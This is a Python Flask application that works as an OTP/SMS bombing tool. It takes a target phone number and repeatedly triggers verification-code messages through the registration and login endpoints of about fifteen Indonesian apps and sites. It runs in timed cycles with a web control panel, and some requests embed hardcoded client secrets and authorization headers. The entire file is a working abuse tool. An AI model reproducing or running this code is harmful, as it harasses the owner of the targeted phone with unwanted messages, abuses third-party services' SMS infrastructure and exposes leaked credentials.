import os, time, random, json, threading
from flask import Flask, render_template, request, jsonify
import requests
import urllib3

app = Flask(__name__)

# ================= STATE GLOBAL =================
JOBS = {}
LOCK = threading.Lock()

# ================= ENDPOINT LIST =================
def build_endpoints(nomor):
    b = nomor[1:12]
    c = "62" + b
    ua = {'User-Agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}

    return [
        ("ktbs", lambda: requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{nomor}', timeout=12)),
        ("klikwa", lambda: requests.post("https://api.klikwa.net/v1/number/sendotp",
            headers={**ua, 'Authorization': 'Basic QjMzOkZSMzM='},
            data=json.dumps({"number": "+62" + b}), timeout=12)),
        ("payfazz", lambda: requests.post("https://api.payfazz.com/v2/phoneVerifications",
            data={"phone": "0" + nomor},
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
            timeout=12)),
        ("pinjamindo", lambda: requests.get(
            f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{b}"
            f"&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay"
            f"&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh"
            f"&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011"
            f"&sign=46565D573B5BB08099A60A3414F265550092E215", timeout=12)),
        ("jumpstart", lambda: requests.post("https://api.jumpstart.id/graphql",
            headers={**ua, 'content-type': 'application/json'},
            data=json.dumps({
                "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
                "variables": {"phoneNo": "+62" + b},
                "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
            }), timeout=12)),
        ("asani", lambda: requests.post("https://api.asani.co.id/api/v1/send-otp",
            headers=ua, data=json.dumps({"phone": "62" + b, "email": "test@gmail.com"}), timeout=12)),
        ("depop", lambda: requests.put("https://webapi.depop.com/api/auth/v1/verify/phone",
            data=json.dumps({"phone_number": nomor, "country_code": "ID"}),
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}, timeout=12)),
        ("battlefront", lambda: requests.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
            headers={'user-agent': 'okhttp/3.10.0'}, data={'mobile_no': b}, timeout=12)),
        ("klikindomaret", lambda: requests.get(
            f"https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={nomor}",
            headers=ua, timeout=12)),
        ("bukuwarung", lambda: requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            data=json.dumps({"action": "LOGIN_OTP", "countryCode": "+62", "deviceId": "test-1",
                             "method": "WA", "phone": nomor,
                             "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                             "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"}), timeout=12)),
        ("tokko", lambda: requests.post("https://api.tokko.io/graphql",
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            data=json.dumps({
                "operationName": "generateOTP",
                "variables": {"generateOtpInput": {"phoneNumber": "+62" + nomor, "hashCode": "",
                                                   "channel": "WHATSAPP", "userType": "MERCHANT"}},
                "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
            }), timeout=12)),
        ("carsome", lambda: requests.post("https://www.carsome.id/website/login/sendSMS",
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            data=json.dumps({"username": nomor, "optType": 1}), timeout=12)),
        ("misteraladin", lambda: requests.post("https://m.misteraladin.com/api/members/v2/otp/request",
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            data=json.dumps({"phone_number_country_code": "62", "phone_number": nomor, "type": "register"}),
            timeout=12)),
        ("harvestcake", lambda: requests.post("https://harvestcakes.com/register",
            data={"phone": b}, headers=ua, timeout=12)),
        ("jagreward", lambda: requests.get(f"https://id.jagreward.com/member/verify-mobile/{b}",
            headers={"User-Agent": "Mozilla/5.0"}, timeout=12)),
    ]


# ================= HELPER =================
def push_log(job_id, msg, keep=200):
    with LOCK:
        if job_id not in JOBS:
            return
        JOBS[job_id]["log"].append(msg)
        JOBS[job_id]["log"] = JOBS[job_id]["log"][-keep:]


def should_stop(job_id):
    with LOCK:
        return JOBS.get(job_id, {}).get("stop", False)


# ================= WORKER (SOFT MODE) =================
def worker(job_id, nomor, cycles, delay, max_per_cycle, gap):
    endpoints = build_endpoints(nomor)
    push_log(job_id, f"[START] target={nomor} cycles={cycles} delay={delay}s "
                     f"max_per_cycle={max_per_cycle} gap={gap}s")

    with LOCK:
        JOBS[job_id]["status"] = "running"

    for cyc in range(1, cycles + 1):
        if should_stop(job_id):
            push_log(job_id, "[STOP] dihentikan user")
            with LOCK:
                JOBS[job_id]["status"] = "stopped"
            return

        push_log(job_id, f"[CYCLE] {cyc}/{cycles}")

        total = len(endpoints)
        limit = min(max_per_cycle, total)
        if limit < total:
            sample = random.sample(endpoints, limit)
        else:
            sample = endpoints[:]

        for name, fn in sample:
            if should_stop(job_id):
                push_log(job_id, "[STOP] dihentikan user")
                with LOCK:
                    JOBS[job_id]["status"] = "stopped"
                return

            try:
                fn()
                with LOCK:
                    JOBS[job_id]["count"] += 1
                push_log(job_id, f"[OK]   {name} @ {time.strftime('%H:%M:%S')}")
            except Exception as e:
                push_log(job_id, f"[ERR]  {name}: {type(e).__name__}")

            if gap > 0:
                for s in range(gap):
                    if should_stop(job_id):
                        push_log(job_id, "[STOP] dihentikan user")
                        with LOCK:
                            JOBS[job_id]["status"] = "stopped"
                        return
                    time.sleep(1)

        if cyc < cycles:
            for s in range(delay):
                if should_stop(job_id):
                    push_log(job_id, "[STOP] dihentikan user")
                    with LOCK:
                        JOBS[job_id]["status"] = "stopped"
                    return
                time.sleep(1)
                if s % 15 == 0 and s > 0:
                    push_log(job_id, f"[WAIT] siklus berikutnya dalam {delay - s}s")

    push_log(job_id, "[DONE] semua cycle selesai")
    with LOCK:
        JOBS[job_id]["status"] = "done"


# ================= ROUTES =================
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/start', methods=['POST'])
def api_start():
    data = request.get_json(silent=True) or {}
    nomor = str(data.get('nomor', '')).strip()

    cycles        = int(data.get('cycles', 5))
    delay         = int(data.get('delay', 180))
    max_per_cycle = int(data.get('max_per_cycle', 5))
    gap           = int(data.get('gap', 10))

    if not nomor or not nomor.isdigit() or len(nomor) < 10 or len(nomor) > 15:
        return jsonify({"error": "Nomor tidak valid (10-15 digit angka)"}), 400
    if cycles < 1 or cycles > 30:
        return jsonify({"error": "Cycles 1-30"}), 400
    if delay < 60 or delay > 900:
        return jsonify({"error": "Delay 60-900 detik"}), 400
    if max_per_cycle < 1 or max_per_cycle > 15:
        return jsonify({"error": "Max per cycle 1-15"}), 400
    if gap < 3 or gap > 60:
        return jsonify({"error": "Gap 3-60 detik"}), 400

    total_hits = cycles * max_per_cycle
    if total_hits > 150:
        return jsonify({"error": f"Total hits ({total_hits}) terlalu besar. Maks 150 per job. "
                                 f"Kurangi cycles atau max_per_cycle."}), 400

    job_id = str(int(time.time() * 1000))
    JOBS[job_id] = {
        "status": "starting",
        "count": 0,
        "log": [],
        "nomor": nomor,
        "stop": False,
        "created": time.time(),
        "total_planned": total_hits,
    }
    t = threading.Thread(
        target=worker,
        args=(job_id, nomor, cycles, delay, max_per_cycle, gap),
        daemon=True
    )
    t.start()
    return jsonify({"job_id": job_id, "total_planned": total_hits})


@app.route('/api/status/<job_id>')
def api_status(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Job tidak ditemukan"}), 404
    return jsonify({
        "status": job["status"],
        "count": job["count"],
        "log": job["log"][-100:],
        "nomor": job["nomor"],
        "uptime": int(time.time() - job["created"]),
        "total_planned": job.get("total_planned", 0),
    })


@app.route('/api/stop/<job_id>', methods=['POST'])
def api_stop(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Job tidak ditemukan"}), 404
    job["stop"] = True
    return jsonify({"ok": True})


@app.route('/api/jobs')
def api_jobs():
    out = []
    for jid, j in list(JOBS.items())[-20:]:
        out.append({
            "job_id": jid,
            "nomor": j["nomor"],
            "status": j["status"],
            "count": j["count"],
        })
    return jsonify(out)


@app.route('/healthz')
def healthz():
    return "ok", 200


# ================= MAIN =================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
